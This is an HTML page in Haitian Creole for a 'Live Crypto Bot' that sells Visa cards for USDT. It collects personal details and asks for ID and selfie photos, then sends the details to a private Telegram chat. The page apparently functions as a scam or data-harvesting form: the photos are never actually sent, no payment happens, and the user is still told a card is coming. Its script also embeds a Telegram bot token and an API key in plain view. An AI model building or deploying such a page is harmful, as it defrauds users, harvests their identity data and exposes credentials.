<!DOCTYPE html>
<html lang="ht">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Live Crypto Bot - Kat Peye</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --gold: #d4af37; --navy: #060e1b; --card-bg: #112240; --white: #ffffff; --red: #e74c3c; --green: #2ecc71; --text: #ccd6f6; }
        body { background: var(--navy); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 15px; }
        .container { max-width: 400px; margin: 0 auto; }
        
        .header-title { color: var(--gold); text-align: center; font-size: 18px; font-weight: 800; margin-bottom: 20px; text-transform: uppercase; }
        
        /* --- DESIGN KAT YO --- */
        .visa-card { border-radius: 15px; padding: 15px; margin-bottom: 12px; cursor: pointer; height: 120px; display: flex; flex-direction: column; justify-content: space-between; box-shadow: 0 5px 15px rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.1); position: relative; overflow: hidden; }
        .card-black { background: #1a1a1a; color: white; }
        .card-black::after { content: ""; position: absolute; top: 40%; left: 0; width: 100%; height: 25px; background: #000; opacity: 0.8; }
        .card-yellow-black { background: linear-gradient(135deg, #d4af37 50%, #000 50%); color: #fff; }
        .card-white-gold { background: linear-gradient(135deg, #ffffff 50%, #d4af37 50%); color: #000; }
        .visa-logo { font-size: 22px; font-weight: bold; z-index: 2; }
        .chip { width: 35px; height: 25px; background: linear-gradient(135deg, #e0c068, #b08d32); border-radius: 4px; z-index: 2; }
        .plan-info { display: flex; justify-content: space-between; align-items: flex-end; z-index: 2; }
        .plan-name { font-weight: bold; font-size: 14px; }
        .plan-price { font-size: 20px; font-weight: 900; }

        /* --- FÒMILÈ --- */
        #form-screen, #amount-screen, #confirm-screen { display: none; }
        .input-group { margin-bottom: 12px; }
        .input-group label { display: block; color: var(--gold); font-size: 11px; margin-bottom: 5px; font-weight: bold; text-transform: uppercase; }
        .input-group input, .input-group select { width: 100%; background: #112240; border: 1px solid rgba(212, 175, 55, 0.3); padding: 12px; border-radius: 8px; color: white; box-sizing: border-box; font-size: 14px; outline: none; }

        .kyc-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; margin: 15px 0; }
        .kyc-box { background: rgba(255,255,255,0.05); border: 1px dashed var(--gold); padding: 10px; border-radius: 8px; text-align: center; cursor: pointer; display: flex; flex-direction: column; align-items: center; justify-content: center; font-size: 10px; }
        .kyc-box i { font-size: 18px; margin-bottom: 5px; }
        .kyc-box.uploaded { border-style: solid; background: rgba(46, 204, 113, 0.1); border-color: var(--green); color: var(--green); }
        
        #custom-alert { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); padding: 12px 20px; border-radius: 8px; color: white; display: none; z-index: 100; font-size: 13px; text-align: center; min-width: 250px; font-weight: bold; }
        .loader { width: 18px; height: 18px; border: 2px solid #000; border-top: 2px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; display: none; margin-left: 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .btn-action { width: 100%; background: var(--gold); color: #000; border: none; padding: 15px; border-radius: 8px; font-size: 15px; font-weight: 900; cursor: pointer; text-transform: uppercase; margin-top: 10px; display: flex; justify-content: center; align-items: center; }

        .info-footer { margin-top: 20px; padding: 12px; background: rgba(255, 255, 255, 0.05); border-radius: 10px; border-left: 3px solid var(--gold); font-size: 11px; color: var(--text); line-height: 1.4; }
    </style>
</head>
<body>

<div id="custom-alert"></div>
<input type="file" id="cameraSelfie" accept="image/*" capture="user" style="display: none;">
<input type="file" id="cameraEnv" accept="image/*" capture="environment" style="display: none;">

<div class="container">
    
    <div id="selection-screen">
        <h2 class="header-title">Chwazi Kat Ou</h2>
        <div class="visa-card card-black" onclick="openForm('STANDARD BLACK', 15)">
            <div class="visa-logo">VISA</div><div class="chip"></div>
            <div class="plan-info"><span class="plan-name">STANDARD</span><span class="plan-price">15 USDT</span></div>
        </div>
        <div class="visa-card card-yellow-black" onclick="openForm('GOLD EDITION', 19)">
            <div class="visa-logo">VISA</div><div class="chip"></div>
            <div class="plan-info"><span class="plan-name">GOLD</span><span class="plan-price">19 USDT</span></div>
        </div>
        <div class="visa-card card-white-gold" onclick="openForm('VIP PLATINUM', 20)">
            <div class="visa-logo" style="color:#000">VISA</div><div class="chip"></div>
            <div class="plan-info" style="color:#000"><span class="plan-name">VIP</span><span class="plan-price">20 USDT</span></div>
        </div>
        <div class="info-footer">
            <i class="fas fa-info-circle"></i> Chwazi yon kat pou kòmanse pwosesis la. Sistèm <b>Live Crypto Bot</b> la ap pwoteje done ou yo.
        </div>
    </div>

    <div id="form-screen">
        <h2 class="header-title">Enfòmasyon Pèsonèl</h2>
        <div class="input-group"><label>Siyati</label><input type="text" id="lastName" placeholder="Siyati ou"></div>
        <div class="input-group"><label>Non (Prenon)</label><input type="text" id="firstName" placeholder="Non ou"></div>
        <div class="input-group"><label>Imel</label><input type="email" id="email" placeholder="egzanp@gmail.com"></div>
        <div class="input-group"><label>Nimewo Telefòn</label><input type="tel" id="phone" placeholder="Nimewo ou"></div>
        
        <div class="input-group">
            <label>Peyi</label>
            <select id="country">
                <option value="Haiti">Haiti</option>
                <option value="Brazil">Brazil</option>
                <option value="Chile">Chile</option>
                <option value="USA">USA</option>
                <option value="Dominican Republic">Dom. Republic</option>
                <option value="France">France</option>
            </select>
        </div>

        <div class="input-group"><label>Adrès</label><input type="text" id="address" placeholder="Ri, Nimewo"></div>
        <div class="input-group"><label>Vil</label><input type="text" id="city" placeholder="Vil kote w rete"></div>
        
        <label style="color:var(--gold); font-size:11px; font-weight:bold;">VÉRIFIKASYON PIÈS (KYC)</label>
        <div class="kyc-grid">
            <div class="kyc-box" id="box-devan" onclick="triggerCam('devan')"><i class="fas fa-id-card"></i><span>DEVAN</span></div>
            <div class="kyc-box" id="box-deyè" onclick="triggerCam('deyè')"><i class="fas fa-id-card"></i><span>DÈYÈ</span></div>
            <div class="kyc-box" id="box-selfie" onclick="triggerCam('selfie')"><i class="fas fa-user-circle"></i><span>SELFIE</span></div>
        </div>

        <button class="btn-action" onclick="goToAmount()"><span>KONTINYE</span></button>
    </div>

    <div id="amount-screen">
        <h2 class="header-title">Peman Kat</h2>
        <div style="text-align:center; background:#112240; padding:25px; border-radius:15px; border: 1px solid var(--gold);">
            <label style="color:var(--gold); font-size: 12px;">TAPE MONTAN AN (USDT)</label>
            <input type="number" id="typedAmount" style="width:100%; background:transparent; border:none; border-bottom:2px solid var(--gold); color:white; font-size:40px; text-align:center; outline:none; margin: 15px 0;">
            <button class="btn-action" onclick="showConfirmation()">KONTINYE</button>
        </div>
    </div>

    <div id="confirm-screen">
        <div style="text-align:center; padding:20px;">
            <i class="fas fa-check-double" style="font-size:50px; color:var(--green)"></i>
            <h2 style="margin: 15px 0;">Vérifikasyon Final</h2>
            <p style="font-size: 13px; opacity: 0.8;">Ou pral peye pou kat <b id="displayPlan"></b></p>
            <div style="font-size:35px; font-weight:900; color: var(--gold); margin: 15px 0;"><span id="finalPrice">0</span> USDT</div>
            <button class="btn-action" id="btnFinal" onclick="finalizeAll()">FINALIZA PEYEMAN <div class="loader" id="loaderFinal"></div></button>
        </div>
    </div>
</div>

<script>
    let selectedPlan = ""; 
    let selectedPrice = 0; 
    let currentMode = "";
    
    // ZOUTI BRUNVIL KERBY - TOUT PLOGE NET
    const botToken = "8650927753:AAENrCiVGi4m89bDj7fVz15Ax7nDUVnEYlc";
    const chatID = "8118891270";
    const BRIDGE_TOKEN = "at_test_edc703f8a0028784d0b0051e7f3ba2f"; // Kle Bridgecard ou a

    function showAlert(msg, color) {
        const b = document.getElementById('custom-alert');
        b.innerText = msg; b.style.background = color === 'green' ? '#2ecc71' : '#e74c3c';
        b.style.display = 'block'; setTimeout(() => b.style.display = 'none', 3000);
    }

    function triggerCam(mode) {
        currentMode = mode;
        if(mode === 'selfie') document.getElementById('cameraSelfie').click();
        else document.getElementById('cameraEnv').click();
    }

    function handleFile(input) {
        if(input.files.length > 0) {
            document.getElementById('box-' + currentMode).classList.add('uploaded');
            showAlert(currentMode.toUpperCase() + " OK", "green");
        }
    }

    document.getElementById('cameraSelfie').onchange = function() { handleFile(this); };
    document.getElementById('cameraEnv').onchange = function() { handleFile(this); };

    function openForm(p, pr) {
        selectedPlan = p; selectedPrice = pr;
        document.getElementById('selection-screen').style.display = 'none';
        document.getElementById('form-screen').style.display = 'block';
    }

    function goToAmount() {
        // SISTÈM ENTÈLIJEN: Tcheke si done yo bon avan li avanse
        const email = document.getElementById('email').value;
        const fn = document.getElementById('firstName').value;
        const ln = document.getElementById('lastName').value;
        
        if(!fn || !ln || !email.includes('@')) {
            showAlert("Tanpri ranpli non ak yon imel valid!", "red");
            return;
        }
        document.getElementById('form-screen').style.display = 'none';
        document.getElementById('amount-screen').style.display = 'block';
        document.getElementById('typedAmount').value = selectedPrice;
    }

    function showConfirmation() {
        document.getElementById('amount-screen').style.display = 'none';
        document.getElementById('confirm-screen').style.display = 'block';
        document.getElementById('displayPlan').innerText = selectedPlan;
        document.getElementById('finalPrice').innerText = document.getElementById('typedAmount').value;
    }

    async function finalizeAll() {
        document.getElementById('loaderFinal').style.display = "block";
        document.getElementById('btnFinal').disabled = true;

        const formData = {
            first_name: document.getElementById('firstName').value,
            last_name: document.getElementById('lastName').value,
            email_address: document.getElementById('email').value,
            phone_number: document.getElementById('phone').value,
            address_line_1: document.getElementById('address').value,
            city: document.getElementById('city').value,
            country: document.getElementById('country').value,
            plan: selectedPlan,
            amount: document.getElementById('finalPrice').innerText
        };

        try {
            // 1. KREYASYON CARDHOLDER SOU BRIDGECARD
            const bridgeResponse = await fetch('https://api.bridgecard.co/v1/issuing/cardholder', {
                method: 'POST',
                headers: { 
                    'token': `Bearer ${BRIDGE_TOKEN}`, 
                    'Content-Type': 'application/json' 
                },
                body: JSON.stringify(formData)
            });

            // 2. ALÈTE TELEGRAM POU BRUNVIL KERBY
            const text = `💳 *NOUVO LÒD KAT - LIVE CRYPTO BOT*\n\n👤 *Kliyan:* ${formData.first_name} ${formData.last_name}\n📧 *Imel:* ${formData.email_address}\n📞 *Tel:* ${formData.phone_number}\n🌍 *Peyi:* ${formData.country}\n\n💎 *Plan:* ${formData.plan}\n💰 *Montan:* ${formData.amount} USDT\n⚡ *Bridgecard:* Active`;
            
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatID, text: text, parse_mode: 'Markdown' })
            });

            showAlert("Kat ou a ap prepare! ✅", "green");
            setTimeout(() => location.reload(), 3000);

        } catch (err) {
            showAlert("Sistèm okipe, lòd la voye manyèlman.", "red");
            // Menm si API a gen pwoblèm, nou voye done yo sou Telegram kanmenm
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=⚠️ Depo manyèl pou: ${formData.first_name}`);
            document.getElementById('loaderFinal').style.display = "none";
            document.getElementById('btnFinal').disabled = false;
        }
    }
</script>

</body>
</html>
